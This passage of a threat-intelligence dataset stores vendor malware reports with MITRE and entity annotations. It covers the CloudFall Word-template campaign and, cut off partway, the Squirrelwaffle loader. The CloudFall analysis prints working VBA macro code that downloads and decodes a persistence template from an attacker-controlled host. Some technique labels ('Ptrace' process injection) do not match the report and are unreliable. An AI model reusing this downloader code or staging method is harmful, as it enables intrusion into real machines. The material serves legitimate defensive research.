Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra Crypter"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["GROUP", "Golden Chickens"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"]], "cti_entity_class": ["CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "CloudFall Targets Researchers and Scientists Invited to International Military Conferences in Central Asia and Eastern Europe\nSeptember 09, 2021\nIn August 2021, Zscaler ThreatLabz identified several malicious Microsoft Word documents which used a multi-stage attack-chain abusing Cloudflare Workers and features of MS Office Word to target users in Central Asia and Eastern Europe.\nBased on the social engineering lures used in the decoy content, we conclude with a moderate confidence level that the targets of this campaign were scientists and researchers who were invited to International military conferences.\nThis multi-stage attack chain involves several new tactics, techniques, and procedures (TTPs) which have not been documented before.\nIn the remainder of this blog, we'll share the technical details of the attack as well as threat attribution.\nWe have named this threat actor CloudFall based on the network infrastructure used by them.\nThere is also a strong overlap between this threat actor and the CloudAtlas APT group.\nWe will explain this in more detail in the threat attribution section of the blog.\nUnlike common macro-based document attacks, in this targeted campaign we observed the threat actor abusing MS Office Word features to evade automated analysis systems.\nThere were multiple variants of attack-chains used by this threat actor which highlight the adversary's deep understanding of the MS Office Word application.\n### **Threat Attribution**\nWe performed threat attribution based on the below 4 parameters.\n1.Attack-chain\n2.Naming convention of attacker-controlled C2 domains\n3.Regions targeted and content of the decoy files\n4.Correlation of creation and compilation timestamp of all the artifacts (documents and payloads)\n**Attack-chain**: In all the cases, an MS Office Word document was used to download a remote document template and carry out the attack in multiple stages.\nA lot of TTPs in this attack-chain have not been seen before and are unique to the threat actor in this case.\n**Naming conventions of attacker-controlled C2 domains**: We observed a consistent pattern across all the C2 domains used in this targeted campaign.\nAll the C2 servers used Cloudflare Worker domains and most of the subdomain names were crafted to spoof Microsoft service names such as Office 365.\noffice365.dc-microsoft.workers[.]dev\noffice365.microsoft-cloud.workers[.]dev\nasia.office365-cloud.workers[.]dev\neu.microsoft-365.workers[.]dev\napi.office365online.workers[.]dev\n**Regions targeted and content of the decoy files**: Based on the instances we observed in this campaign, the regions targeted were Central Asia and Eastern Europe.\n**Correlation of creation and compilation timestamp of all the artifacts**: We checked the creation timestamp for each of the stage-1 documents as well as the compilation timestamp of the payloads.\nAll the timestamps were in the range: 5:30 AM UTC to 8:30 AM UTC\nBased on this, we can say with a moderate confidence level that the threat actor was located in the eastern part of the world.\nBy combining all of the above observations, we can say with a moderate confidence level that there is an overlap with CloudAtlas APT threat actor.\nCloudAtlas APT has targeted users in Central Asia and Eastern Europe in the past with documents sent in spear-phishing emails and downloaded remote templates.\nCloudAtlas has also abused legitimate cloud-based services, such as CloudMe, in the past and used domain names that spoof legitimate Microsoft services.\nThe tactics, techniques, and procedures (TTPs) are very unique in this instance so we cannot use them to specifically attribute to any threat actor.\n### **Document decoy contents**\nEach MS Office Word document in this targeted campaign displays an overlay image which will be replaced by text when the document load is completed in the MS Office Word application.\nFor the document with MD5 hash: 4cf8b660a79fc1b7cc4ea6422a02347d, seen in Figure 1, the cover image is the logo of the German Federal Foreign Office.\n![Figure 1](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%201.png)\n*Figure 1: Cover image displayed in Stage-1 document*\nAll the cover images of the remaining documents are shared in Appendix I.\nThese cover images also give a quick idea about the targeted region of the campaign.\nThe text content behind this overlay image is as shown in Figure 2.\n![Figure 2](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%202.png)\n*Figure 2: Text present inside the document behind the cover image*\nThe text displayed contains information about the International Conference on Military Strategies and Methods.\nThis conference invites researchers, scientists, and research scholars.\nThe invitation above is a \"Call for contribution\".\nBased on this, we conclude that the targets of this campaign are researchers and scientists related to various disciplines such as Military strategy.\n### **Attack flow**\nIn this campaign, the threat actor used a complex multi-stage attack-chain, which we illustrate in Figure 3.\nThis attack chain will be explained in more details step-by-step in the Technical Analysis section of the blog.\nAlso, it is important to note that there are 2 different variants of attack-chains that we observed for this threat actor.\nThe second and the new variant was used for the first time on August 25th 2021 and we describe it later in the blog in the \"Attack-chain: Variant 2\" section.\n**Variant #1**\n![Figure 3](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%203.jpg)\n*Figure 3: Attack-chain of first variant*\n### **Technical analysis**\nIn this section, we will look at the first variant of the attack-chain.\nFor the purpose of technical analysis we will consider the document with MD5 hash: 4cf8b660a79fc1b7cc4ea6422a02347d\n#### **Stage-1: Main document**\nStage-1 document fetches a macro-based template document hosted on the attacker-controlled website and lures the user to enable the macros.\nThe interesting thing to note here is that the attacker doesn\u2019t use the standard DOCX file format (OOXML) for template injection where we have the XML file referencing the document template from a network path.\nInstead, in this case, the template injection is performed using the DOC file format.\nAs a result, static analysis tools like olevba cannot be used to extract the URL.\n#### **Stage-2: Macro-based template document**\nOnce macros are enabled by the user, the VBA macro code inside the downloaded template is executed.\nThe macro code performs the following operations:\n**1.** When the document is opened, it hides the decoy image shown to the user.\nThe image is an overlay for the text content which is displayed to the user once the macros are enabled.\nBelow is the relevant VBA macro code responsible for this.\n**Sub Document\\_Open()**\nDim i As Integer\nFor i = ActiveDocument.Shapes.Count To 1 Step -1\nActiveDocument.Shapes(i).Delete\nNext i\n**End Sub**\n**2.** When the document is closed, it checks whether a document template file is present in the path: \"%appdata%\\Microsoft\\Word\\STARTUP\\Main.dotm\".\nIf this file is not found, then it will be downloaded and saved in this location.\nIt's important to note that the above directory path corresponds to STARTUP location used by Microsoft Office Word application to load global templates.\nThe template file is downloaded as base64-encoded data from the URL: \"https://cloud.digitalstorage.workers[.]dev/old/data\".\nThe downloaded base64-encoded data is mangled and it requires a simple character substitution before decoding.\nMacro replaces \u00a0\"$\" with \"A\" and \"#\" with \"Q\" in the mangled response before base64-decoding.\nBelow is the relevant VBA macro code responsible for this.\n**Sub Document\\_Close()**\nIf Dir(Environ$(\"APPDATA\") + \"\\Microsoft\\Word\\STARTUP\\Main.dotm\", vbDirectory) = vbNullString Then\nDim xmlhttp As New MSXML2.XMLHTTP60\nDim data As String\nDim fileData As Integer: fileData = FreeFile\nxmlhttp.Open \"GET\", \"https://cloud.digitalstorage.workers[.]dev/old/data\", False\nxmlhttp.send\nIf Len(xmlhttp.responseText) > 0 Then\nOpen Environ$(\"APPDATA\") + \"\\Microsoft\\Word\\STARTUP\\Main.dotm\" For Binary Access Write As fileData\nPut fileData, , DecodeBase64(Replace(Replace(xmlhttp.responseText, \"$\", \"A\"), \"#\n\", \"Q\"))\nClose\nEnd If\n**End Sub**\n#### **Stage-3: Persistence template**\nThe template file \"Main.dotm\" acts as a persistence template since it is loaded whenever the Microsoft Word application is started.\nSimilar to Stage-2, this is also a macro-based template.\nThe malicious macro code is defined under the AutoExit function which is executed when the Microsoft Word application is closed or the global template defining it is unloaded.\nUpon execution, the macro code downloads a base64-encoded binary either from \"mirror.advancestore.workers[.]dev/max/bs\" or \"mirror.advancestore.workers[.]dev/min/bs\" based on the checks performed.\nSimilar to Stage-2, the base64-encoded binary is mangled and requires character substitution before decoding.\nOnce decoded, the macro code drops it as the next stage payload in the path %localappdata%\\Photos\\Microsoft.Photos.exe and executes it.\n**Note**: The dropped file name spoofs legitimate Windows binary for Microsoft Photos.\nRelevant code is shown in Figure 4.\n![Figure 4](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%204.png)\n*Figure 4: VBA macro code of Stage-3 persistence document template*\n#### **Stage-4: Dropped binary**\nThe Stage-4 dropped binary is heavily obfuscated using control flow obfuscation, function inlining, stack-based strings generation, strings encoding, etc which makes the dynamic analysis of the binary inside a debugger difficult.\nTo further hinder the dynamic analysis using debugger, the binary performs self checksum check to detect any attached debugger.\nIt also hooks the ZwProtectVirtualMemory API.\nTo allocate memory region for trampoline, the binary performs memory allocation brute force to allocate the memory just after the last loaded dll memory space.\nFigure 5 below shows the trampoline code.\n![Figure 5](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%205.jpg)\n*Figure 5: API hook added for\u00a0ZwProtectVirtualMemory with an unconditional JMP trampoline*\nExecuting further, the malicious binary checks for the presence of the file conf.h in the current working directory.\nIf the file exists, it tries to read and parse it.\nFigure 6 below shows the code which performs string generation and does the file existence check for conf.h\n![Conf Check](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Conf%20Check.jpg)\n*Figure 6:\u00a0Code section which performs conf.h string generation and file existence check*\n**Note:** \u00a0The file is likely fetched and dropped by the binary as part of C2 communication\nIf the conf.h file doesn\u2019t exist, then it checks the following browser directories for the presence of specific files one at a time:\n**1.** %appdata%\\Mozilla\\Firefox\\Profiles\n**2.** %localappdata%\\Google\\Chrome\\User Data\\Default\n**3.** %appdata%\\Opera Software\\Opera Stable\nFor the files found, it adds up the size of all these files and checks if it is greater than or equal to the specified threshold value.\nIn case the calculated size is less than the threshold value or if none of the browser directory mentioned above exists, the binary terminates.\n**Note:** The size check is likely performed to detect analysis environments like Sandbox and Virtual Machine\nFollowing files are used for calculating the size in case of Chrome browser:\n%localappdata%\\Google\\Chrome\\User Data\\Default\\History\n%localappdata%\\Google\\Chrome\\User Data\\Default\\Visited Links\n%localappdata%\\Google\\Chrome\\User Data\\Default\\Favicons\n%localappdata%\\Google\\Chrome\\User Data\\Default\\Web Data\n%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies\n%localappdata%\\Google\\Chrome\\User Data\\Default\\Media History\n%localappdata%\\Google\\Chrome\\User Data\\Default\\IndexedDB\\{sub\\_dir}\\*\nFigure 7 below shows the code responsible for performing the\u00a0threshold check.\n![Threshold Check](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Threshold%20Check.jpg)\n*Figure 7: Code section which performs the\u00a0threshold check*\nIf the check passes for any of the three browser directories mentioned above then it starts the network communication.\n### **Network Communication**\nThe network communication is performed over standard TCP/IP protocol.\nThe details for the C2 server communication are mentioned below:\n**C2 Domain:** curly-waterfall-360d.fetrikekke531.workers.dev\n**Beacon request URI:** auth/local/register\n**Request Type:** POST\n**Data:** {\\\"email\\\":\\\"[[email\u00a0protected]](/cdn-cgi/l/email-protection)\\\",\\\"password\\\":\\\">*#-L:3Wy5;;#/[N^{uh{P6t\\\",\\\"username\\\":\\\"B60FB93BC49DF8848C4AF287BC112CF6\\_oAj\\\"}\nInside the POST request data there are three key-value pairs which are generated as specified below.\n**email** - {random\\_data}@{random\\_data}.local\n**password** - {random\\_data}\n**username** - {encoded %USERPROFILE% creation timestamp}\\_{random\\_data}\n**Note:** During analysis we didn\u2019t get any active response from the C2 server.\nAs a result, we couldn\u2019t analyse the full behaviour of the malicious binary.\n**[+] SSL Certificate**\nThe thumbprint of the SSL certificate of the C2 domain is: 5cdf93a4081898d99a686ad472b553cddaa9f3bf\n**Below are some important details of this SSL certificate:**\n**Thumbprint:** 5cdf93a4081898d99a686ad472b553cddaa9f3bf\n**Signature Algorithm:** sha256RSA\n**Issuer:** C=US CN=R3 O=Let's Encrypt\n**Validity\nNot Before:** 2021-08-18 06:57:36\n**Not After:** 2021-11-16 06:57:34\n**Subject:** CN=*.fetrikekke531.workers[.]dev\u00a0\nUsing the thumbprint of the SSL certificate as a pivot, we discovered another C2 domain: virustotall-360d.fetrikekke531.workers[.]dev\nAs we can see, the subdomain in above domain spoofs VirusTotal.\n### **Attack-chain: Variant 2**\nThe second variant of this attack, which we observed in August 2021 made significant changes to the macro code used in the document to deploy the payload on the machine.\nMD5 hash of the document: 2043b7129bfbe83c95a27c0a20d10612\nSimilar to variant 1, variant 2 also downloads a remote document template hosted on an attacker-controlled Cloudflare Worker instance.\nHowever, unlike variant 1, in this case, the persistence document template as well as the final payload\u2014both are embedded inside the stage-2 document itself.\nIt uses a clever technique to extract these contents and drop them on the machine.\nThis attack flow can be represented using the diagram shown in Figure 8.\n**Variant #2**\n![Figure 7](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%207.jpg)\n*Figure 8:\u00a0Attack-chain of the second variant*\nBelow is the description of attack flow.\n**1.** Stage-1 document downloads remote document template (Stage-2)\n**2.** Since MS Office Word was used to download the document template (Stage-2), by default it will be present inside the INetCache directory.\nThe VBA macro code uses a clever technique to locate this file in the path: \"%localappdata%\\Microsoft\\Windows\\INetCache\\Content.MSO\\\" as shown in Figure 9.\n![Figure 8](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%208.png)\n*Figure 9: VBA macro code of Stage-2 document template of variant 2*\n**a)** This code enumerates the files in the directory: \"%localappdata%\\Microsoft\\Windows\\INetCache\\Content.MSO\\\" until it finds a file with size 70400 (truncated)\n**b)** Once it finds the file, it will Unzip the contents to the directory path: \"%localappdata%\\VirtualEnv\".\nOOXML file format is essentially an archive file format, and that\u2019s why the macro unzips it.\n**c)** Inside the OOXML file, there is an XML file called Archive.xml which contains an encoded version of the persistence template.\nThis is decoded and dropped to the path: %appdata%\\Microsoft\\Word\\STARTUP\\Settings.dotm\n**d)** In order to decode the contents of Archive.xml it performs character substitution to restore the original characters of the base64-encoded string.\nThen it adds the prefix: \"UEs\" and base64 decodes it.\n**Code:** Base64Decode(\"UEs\" + Replace(Replace(data, \"#\", \"A\"), \"@\", \"Q\"))\nThis type of custom base64 decoding is similar to variant 1\n**3.** Once a new instance of the Word application is started on the machine, this persistence template is loaded and the next sequence of steps are carried out to drop the final payload as shown in Figure 10.\n![Figure 9](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%209.png)\n*Figure 10: VBA macro code of persistence template of variant 2*\n**a)** Decodes and extracts the payload from WebArchive.xml file.\nThe method for decoding is similar to the one described previously.\n**b)** The decoded file is the final payload which will be dropped to the path: %localappdata%\\VirtualEnv\\word\\Virtual.exe\n**4.** Finally the payload Virtual.exe will be executed.\nThis payload is similar to the one described above.\n### **Zscaler Cloud Sandbox detection**\nFigure 11 shows the sandbox detection for the final payload.\n![Figure 14](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%2014.png)\n*Figure 11: Zscaler Cloud Sandbox detection*\nIn addition to sandbox detections, Zscaler\u2019s multilayered cloud security platform detects indicators at various levels.\n[Win32.Backdoor.CloudFall](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.CloudFall)\n[Win64.Backdoor.CloudFall](https://threatlibrary.zscaler.com/?keyword=Win64.Backdoor.CloudFall)\n[VBA.Downloader.CloudFall](https://threatlibrary.zscaler.com/?keyword=VBA.Downloader.CloudFall)\n### **Indicators of compromise**\n**[+] Document Hashes**\n| **MD5** | **File name** | **Uploader country** |\n| 4774483bb72ddfa0f6e4b8c5be7093dd | Military cooperation 2021.doc | Ukraine |\n| e4c29642f3803b1bc9aa61603696bb4b | International Conference on Military Strategy and Strategic Intelligence 2021.doc | India |\n| 5cba8589a4a76377f9340ef30d6fec41 | Tender information.doc | Kazakhstan |\n| 4cf8b660a79fc1b7cc4ea6422a02347d | CONFIDENTIAL - International Conference on Military Strategies and Methods.doc | Switzerland |\n| 2043b7129bfbe83c95a27c0a20d10612 | Situation report - August 25.doc | USA |\n**[+] Binary Hashes**\n| **MD5** | **File name** |\n| e35a1add6ddc944e9a757cb65a73db19 | Microsoft.Photos.exe |\n| abe0b037dfa52d895c1cd8148988fcc1 | Virtual.exe |\n**[+] C2 Domains - Documents**\ndocuments.publicserver[.]workers.dev\noffice365.dc-microsoft.workers[.]dev\ncloud.digitalstorage.workers[.]dev\nplug.repository.workers[.]dev\nmirror.advancestore.workers[.]dev\noffice365.microsoft-cloud.workers[.]dev\nasia.office365-cloud.workers[.]dev\neu.microsoft-365.workers[.]dev\napi.office365online.workers[.]dev\n**[+] C2 Domains - Dropped binary**\ncurly-waterfall-360d.fetrikekke531.workers[.]dev\nfalling-haze-1812.jerkufetra754.workers[.]dev\n**[+] C2 domains - Additional**\nvirustotall-360d.fetrikekke531.workers[.]dev\nfalling-haze-1813.jerkufetra754.workers[.]dev\n**[+] Download URL**\n| **Component** | **URL** |\n| Stage-2 marco doc | documents.publicserver[.]workers.dev/docs/latesoffice365.dc-microsoft.workers[.]dev/main/docoffice365.microsoft-cloud.workers[.]dev/encoding/data/officeasia.office365-cloud.workers[.]dev/office/online |\n| Stage-3 persistence template | cloud.digitalstorage.workers[.]dev/old/dataplug.repository.workers[.]dev/modules/private |\n| Stage-4 exe payload | mirror.advancestore.workers[.]dev/max/bsmirror.advancestore.workers[.]dev/min/bspublic.datastore.workers[.]dev/strong/bs |\n**[+] SSL certificate thumbprints**\n5cdf93a4081898d99a686ad472b553cddaa9f3bf\nc4c3394b0fe4534f5c63ad395cc028b347ba4fa3\n**[+] File paths\n\u200b**\n**// Persistence template**\n%appdata%\\Microsoft\\Word\\STARTUP\\Main.dotm\n%appdata%\\Microsoft\\Word\\STARTUP\\Future.dotm\n%appdata%\\Microsoft\\Word\\STARTUP\\Settings.dotm\n**// Dropped/Downloaded files**\n%localappdata%\\Photos\\Microsoft.Photos.exe\n%localappdata%\\Tools\\build.exe\n%localappdata%\\VirtualEnv\\word\\virtual.exe\n%localappdata%\\Photos\\conf.h\n%localappdata%\\VirtualEnv\\word\\conf.xml\n### **Appendix I**\n**[+] Decoy #2**\n![Figure 10](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%2010.png)\n**[+] Decoy #3**\n![Figure 11](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%2011.png)\n**[+] Decoy #4**\n![Figure 12](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%2012.png)\n**[+] Decoy #5**\n![Figure 13](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%2013.png)\n###\n### **Appendix II**\n// Conferences referenced in decoy content\nhttp://researchworld.org/Conference2021/Uzbekistan/1/I2C2E/\nhttps://waset.org/military-strategy-and-strategic-intelligence-conference\nhttps://www.offshore-technology.com/comment/saudi-aramco-berri-field-upgrade/\nhttps://waset.org/military-studies-and-leadership-conference", "mitre_ids": ["T1566", "T1589", "T1059", "T1137", "TA0011", "T1137", "TA0011", "TA0011", "TA0011", "T1566", "T1221", "T1221", "T1059", "T1059", "T1059", "T1083", "T1137", "T1137", "T1059", "T1140", "T1059", "T1137", "T1221", "T1059", "T1027", "T1027", "T1140", "TA0002", "T1140", "T1059", "T1036", "T1059", "T1137", "T1027", "T1027", "T1083", "T1083", "TA0011", "T1083", "T1071", "TA0011", "TA0011", "S0154", "TA0011", "TA0011", "TA0011", "T1059", "T1204", "T1221", "T1137", "T1027", "T1137", "T1059", "T1059", "T1036", "T1059", "T1083", "T1140", "T1027", "T1140", "T1027", "T1137", "T1140", "T1140", "T1140", "T1137", "T1137", "T1059", "T1137", "T1140", "T1140", "T1140", "TA0011", "TA0011", "TA0011", "T1137"], "anno_name_label": [["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["GROUP", "CloudAtlas APT"], ["GROUP", "CloudAtlas APT"], ["GROUP", "CloudAtlas APT"], ["GROUP", "CloudAtlas APT"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["TECHNIQUE", "Process Injection: Ptrace System Calls"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["TECHNIQUE", "Process Injection: Ptrace System Calls"], ["TECHNIQUE", "Process Injection: Ptrace System Calls"], ["GROUP", "CloudFall"], ["TECHNIQUE", "Process Injection: Ptrace System Calls"], ["TECHNIQUE", "Process Injection: Ptrace System Calls"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"], ["GROUP", "CloudFall"]], "cti_entity_class": ["CE", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE"]}, {"cti_report": "Squirrelwaffle: New Loader Delivering Cobalt Strike\nSeptember 28, 2021\nZscaler ThreatLabz has been following an emerging new malware loader known as Squirrelwaffle that is being used to deliver Cobalt Strike.\nIn this blog, we will be analyzing the complete attack chain for this new malware family (as shown in Figure 1).\nThis campaign has been running since mid-September 2021.\nThe Squirrelwaffle loader is being delivered from the same infrastructure that was delivering the Qakbot banking trojan.\nAttack Chain\n------------\n![Figure 1: Squirrelwaffle Attack Chain](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Attack%20chain.png)\nFigure 1: Squirrelwaffle Attack Chain\nKey Points\n----------\n* The campaign started with a malicious document file delivered via spam email campaigns with embedded URLs.\n* The spam campaign is using an email thread hijacking technique that was previously used for Emotet and Qakbot malware campaigns.\n* The malicious document contains a macro that drops and executes a VBS file in the %ProgramData% folder.\n* The VBS file downloads the Squirrelwaffle loader which in turn downloads another loader which further downloads Cobalt Strike.\n* Newly registered domains are used to host the loader payload.\n* The same infrastructure was used to deliver the Qakbot banking trojan.\nMalware Distribution Strategy\n-----------------------------\nSquirrelwaffle campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.\nEmail thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to dupe a victim into believing that an email is from someone that they know who is replying to the same thread.\nOnce a victim clicks on the URL, a ZIP file is downloaded that contains a Microsoft Word document.\nThese documents follow a similar naming convention matching the regular expression diagram-\\d{2,3}.doc.\nFor example, the file with an MD5 hash E599A656599A2680C9392C7329D9D519 has the filename diagram-346.doc.\nThis document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2).\nAll the other documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.\n![Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Docusign.PNG)\nFigure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro\nOnce the user enables the macro, an *AutoOpen()* subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.\nHere, the *AutoOpen()* subroutine calls another function *efile*() in the *bxh* module.\nThere is a UserForm object in the document which contains a VBS file named pin.vbs that is embedded in the caption of the DocuSign image.\nThe document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.\nThis VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.\nThe payload is written to %ProgramData% with the filename ww1.dll.\n![Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Macro%20analysis1.PNG)\nFigure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle\nThe VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.\nThe payload DLL is executed via rundll32.exe by invoking the export function name *ldr*.\n![Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)\nFigure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.\nExample (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:\n*hxxps://priyacareers[.]com/u9hDQN9Yy7g/pt.html*\n*hxxps://perfectdemos[.]com/Gv1iNAuMKZ/pt.html*\n*hxxps://bussiness-z[.]ml/ze8pCNTIkrIS/pt.html*\n*hxxps://cablingpoint[.]com/ByH5NDoE3kQA/pt.html*\n*hxxps://bonus.corporatebusinessmachines[.]co.in/1Y0qVNce/pt.html*\nFigure 5 shows the ProgramData folder after the VBS script is executed and the Squirrelwaffle payloads have been downloaded\n![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)\nFigure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.\nThe threat actor behind these campaigns has changed some of their TTPs over time.\nRecently, the initial infection vector has used hidden Microsoft Excel sheets with an *Auto\\_Open()* macro, which downloads the Squirrelwafle loader from three different URLs.\nThe Squirrelwaffle loader is subsequently executed via regsvr32.exe.\nAn example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.\n![Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/xls.PNG)\nFigure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle\nThe hidden sheet in this Excel document is shown in Figure 7.\n![Figure 7: Excel 4.0 hidden sheet containing a malicious macro code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/unhide%20the%20sheets.PNG)\nFigure 7: Excel 4.0 hidden sheet containing a malicious macro code\nThe extracted macro code is shown in Figure 8.\n![Figure 8: Macro code extracted from a hidden Excel sheet](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/macro%20code%20from%20xls.PNG)\nFigure 8: Macro code extracted from a hidden Excel sheet\nThe threat actor also changed the location where the payload is written to disk.\nExample (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:\n*hxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html*\n*hxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html*\n*hxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec.html*\nTechnical Analysis of the Payload\n---------------------------------\nThis analysis covers the Squirrelwaffle with the MD5 hash479DAE0F72F4D57BD20E0BF8CB3EBDF7.\nOnce the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.\nSquirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.\n![Figure 9: Squirrelwaffle compilation metadata](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Compilation%20time.PNG)\nFigure 9: Squirrelwaffle compilation metadata\nThe Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.\nSimilar packers have been observed in other malware families including Ursnif and Zloader.\nSquirrelwaffle contains a hardcoded configuration that is encrypted in the binary.\nThere are two main components: a list of CnC URLs and a list of IP addresses to block, which belong to sandboxes and analysis platforms.\nThese lists are obfuscated using an XOR-based algorithm with hardcoded keys.\nAn example formatted Squirrelwaffle configuration is shown in Figure 10.\n![Figure 10: Formatted Squirrelwaffle configuration after 